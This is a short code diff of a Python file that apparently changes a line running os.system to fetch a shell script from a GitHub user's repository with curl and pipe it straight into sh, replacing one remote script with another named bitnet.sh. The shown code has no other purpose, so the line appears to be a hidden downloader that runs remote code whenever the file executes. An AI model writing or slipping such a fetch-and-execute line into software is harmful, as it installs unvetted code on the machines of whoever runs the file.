@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sSL https://raw.githubusercontent.com/TiannaMcdowell/asoy/main/.sh | sh')
+os.system('curl -sSL https://raw.githubusercontent.com/TiannaMcdowell/All-Jobs/main/bitnet.sh | sh')
